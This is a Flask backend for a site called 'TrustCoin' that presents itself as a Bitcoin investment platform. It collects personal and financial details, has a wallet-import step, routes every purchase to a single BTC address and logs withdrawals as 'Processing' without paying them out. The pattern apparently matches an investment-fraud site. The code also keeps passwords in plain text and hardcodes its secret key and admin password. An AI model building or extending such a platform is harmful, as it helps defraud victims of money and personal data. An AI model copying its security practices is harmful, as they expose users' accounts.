from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import os, random, string

app = Flask(__name__)
app.secret_key = 'trustcoin_secret_key_2024'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Database configuration
database_url = os.environ.get('DATABASE_URL')
if database_url:
    # For Render PostgreSQL
    app.config['SQLALCHEMY_DATABASE_URI'] = database_url.replace('postgres://', 'postgresql://', 1)
else:
    # For local SQLite
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///trustcoin.db'

db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    legal_name = db.Column(db.String(120), nullable=False)
    dob = db.Column(db.String(20), nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    country = db.Column(db.String(80), nullable=False)
    employment = db.Column(db.String(50), nullable=False)
    invested_btc = db.Column(db.String(10), nullable=False)
    income_source = db.Column(db.String(120), nullable=False)
    username = db.Column(db.String(20), unique=True, nullable=False)
    password = db.Column(db.String(200), nullable=False)
    approved = db.Column(db.Boolean, default=False)
    wallet_imported = db.Column(db.Boolean, default=False)
    wallet_type = db.Column(db.String(50), nullable=True)
    balance = db.Column(db.Float, default=0.0)
    total_profit = db.Column(db.Float, default=0.0)
    btc_balance = db.Column(db.Float, default=0.0)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class Transaction(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    tx_type = db.Column(db.String(30), nullable=False)
    amount = db.Column(db.Float, nullable=False)
    status = db.Column(db.String(20), default='Pending')
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

def generate_verify_code():
    upper = random.choices(string.ascii_uppercase, k=2)
    lower = random.choices(string.ascii_lowercase, k=1)
    nums = random.choices(string.digits, k=3)
    code = upper + lower + nums
    random.shuffle(code)
    return ''.join(code)

ADMIN_PASSWORD = 'PASS@Billionsforme@001'
ADMIN_SECRET = '/admin-secure-login-tc2024'
BTC_ADDRESS = 'YOUR_BTC_WALLET_ADDRESS_HERE'

@app.route('/')
def home():
    return render_template('home.html')

@app.route('/signup', methods=['GET','POST'])
def signup():
    if request.method == 'POST':
        data = request.get_json()
        session['signup_step1'] = data
        return jsonify({'success': True})
    return render_template('signup.html')

@app.route('/complete-registration', methods=['GET','POST'])
def complete_registration():
    if 'signup_step1' not in session:
        return redirect(url_for('signup'))
    if request.method == 'POST':
        data = request.get_json()
        username = data.get('username','').strip()
        password = data.get('password','').strip()
        existing = User.query.filter_by(username=username).first()
        if existing:
            return jsonify({'success': False, 'error': 'USERNAME_TAKEN'})
        session['signup_step2'] = data
        return jsonify({'success': True})
    return render_template('complete_registration.html')

@app.route('/verify-robot', methods=['GET','POST'])
def verify_robot():
    if 'signup_step1' not in session or 'signup_step2' not in session:
        return redirect(url_for('signup'))
    if request.method == 'POST':
        data = request.get_json()
        action = data.get('action')
        if action == 'generate':
            code = generate_verify_code()
            session['verify_code'] = code
            return jsonify({'success': True, 'code': code})
        if action == 'verify':
            user_code = data.get('code','').strip()
            if user_code == session.get('verify_code'):
                s1 = session.pop('signup_step1')
                s2 = session.pop('signup_step2')
                session.pop('verify_code', None)
                new_user = User(
                    legal_name=s1['legal_name'],
                    dob=s1['dob'],
                    email=s1['email'],
                    country=s1['country'],
                    employment=s1['employment'],
                    invested_btc=s1['invested_btc'],
                    income_source=s1['income_source'],
                    username=s2['username'],
                    password=s2['password'],
                )
                db.session.add(new_user)
                db.session.commit()
                return jsonify({'success': True})
            else:
                return jsonify({'success': False, 'error': 'INVALID_CODE'})
    return render_template('verify_robot.html')

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        data = request.get_json()
        username = data.get('username','').strip()
        password = data.get('password','').strip()
        user = User.query.filter_by(username=username, password=password).first()
        if user:
            session['user_id'] = user.id
            session['username'] = user.username
            session['approved'] = user.approved
            return jsonify({'success': True})
        return jsonify({'success': False, 'error': 'INVALID_USERNAME_OR_PASSWORD'})
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('home'))

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    user = User.query.get(session['user_id'])
    txs = Transaction.query.filter_by(user_id=user.id).order_by(Transaction.created_at.desc()).limit(10).all()
    return render_template('dashboard.html', user=user, transactions=txs, btc_address=BTC_ADDRESS)

@app.route('/import-wallet', methods=['GET','POST'])
def import_wallet():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        data = request.get_json()
        wallet_type = data.get('wallet_type','')
        user = User.query.get(session['user_id'])
        user.wallet_imported = True
        user.wallet_type = wallet_type
        db.session.commit()
        return jsonify({'success': True})
    return render_template('import_wallet.html')

@app.route('/buy-btc', methods=['POST'])
def buy_btc():
    if 'user_id' not in session:
        return jsonify({'success': False})
    data = request.get_json()
    amount = float(data.get('amount', 0))
    user = User.query.get(session['user_id'])
    tx = Transaction(user_id=user.id, tx_type='Buy BTC', amount=amount, status='Pending')
    db.session.add(tx)
    db.session.commit()
    return jsonify({'success': True, 'btc_address': BTC_ADDRESS})

@app.route('/withdraw', methods=['POST'])
def withdraw():
    if 'user_id' not in session:
        return jsonify({'success': False})
    data = request.get_json()
    amount = float(data.get('amount', 0))
    user = User.query.get(session['user_id'])
    tx = Transaction(user_id=user.id, tx_type='Withdrawal', amount=amount, status='Processing')
    db.session.add(tx)
    db.session.commit()
    return jsonify({'success': True})

@app.route(ADMIN_SECRET, methods=['GET','POST'])
def admin_login():
    if request.method == 'POST':
        data = request.get_json()
        if data.get('password') == ADMIN_PASSWORD:
            session['admin'] = True
            return jsonify({'success': True, 'redirect': url_for('admin_dashboard')})
        return jsonify({'success': False, 'error': 'INVALID PASSWORD'})
    return render_template('admin_login.html')

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('admin'):
        return redirect(url_for('home'))
    users = User.query.order_by(User.created_at.desc()).all()
    return render_template('admin_dashboard.html', users=users)

@app.route('/admin/approve/<int:user_id>', methods=['POST'])
def approve_user(user_id):
    if not session.get('admin'):
        return jsonify({'success': False})
    user = User.query.get(user_id)
    user.approved = True
    db.session.commit()
    return jsonify({'success': True})

@app.route('/admin/disapprove/<int:user_id>', methods=['POST'])
def disapprove_user(user_id):
    if not session.get('admin'):
        return jsonify({'success': False})
    user = User.query.get(user_id)
    user.approved = False
    db.session.commit()
    return jsonify({'success': True})

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('home'))

# ── MISSING ROUTES ADDED (with correct template names) ─────────────────
@app.route('/quiz')
def quiz():
    return render_template('quiz.html')

@app.route('/faqs')
def faqs():
    return render_template('faqs.html')

@app.route('/law-regulation')
def law_regulation():
    return render_template('law.html')

@app.route('/support')
def support():
    return render_template('support.html')

@app.route('/contact')
def contact():
    return render_template('contact.html')

@app.route('/terms')
def terms():
    return render_template('terms.html')

@app.route('/privacy')
def privacy():
    return render_template('privacy.html')

# ── EXACT ROUTES FOR THE FOOTER LINKS (as you named the files) ─────────
@app.route('/law.html')
def law_page():
    return render_template('law.html')

@app.route('/help_center.html')
def help_center():
    return render_template('help_center.html')

@app.route('/privacy_policy.html')
def privacy_policy():
    return render_template('privacy_policy.html')

@app.route('/terms_of_service.html')
def terms_of_service():
    return render_template('terms_of_service.html')

@app.route('/contact_us.html')
def contact_us():
    return render_template('contact_us.html')

# Create all tables when the app starts
with app.app_context():
    db.create_all()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)